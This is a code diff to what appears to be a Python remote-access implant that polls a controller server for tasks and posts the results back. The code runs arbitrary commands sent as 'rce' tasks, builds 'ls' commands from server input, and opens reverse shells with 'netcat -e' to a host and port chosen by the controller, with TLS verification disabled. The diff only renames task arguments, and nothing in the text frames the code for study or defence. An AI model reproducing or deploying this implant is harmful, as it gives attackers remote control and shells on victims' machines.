@@ -12,8 +12,8 @@ SERVICE = "https"
 URL = f"{SERVICE}://{HOST}:{PORT}"
 
 
-def reverse_shell(host: int, port: int, binary: str):
-    sp.getoutput(f"netcat -e {binary} {host} {port}")
+def reverse_shell(address: int, port: int, binary: str):
+    sp.getoutput(f"netcat -e {binary} {address} {port}")
 
 data = {
     "address": "192.168.178.107",
@@ -32,14 +32,15 @@ while True:
     for task in tasks:
         if task["type"] in ["rce", "dir", "reverse-shell"]:
             data = {
-                "id": task["id"]
+                "id": task["id"],
+                "success": True
             }
             if task["type"] == "rce":
-                data["output"] = sp.getoutput(task["args"][0])
+                data["output"] = sp.getoutput(task["args"]["cmd"])
             elif task["type"] == "dir":
-                data["output"] = sp.getoutput("ls " + task["args"][0])
+                data["output"] = sp.getoutput("ls " + task["args"]["dir"])
             elif task["type"] == "reverse-shell": 
-                threading.Thread(target=reverse_shell, kwargs={"host":task['args'][0], "port":task['args'][1], "binary": task['args'][2]}).start()
+                threading.Thread(target=reverse_shell, kwargs={"address":task['args']["address"], "port":task['args']["port"], "binary": task['args']["binary"]}).start()
                 data["output"] = "Send reverse shell"
             res = r.post(URL + "/finish/" + name, json=data, verify=False)
 
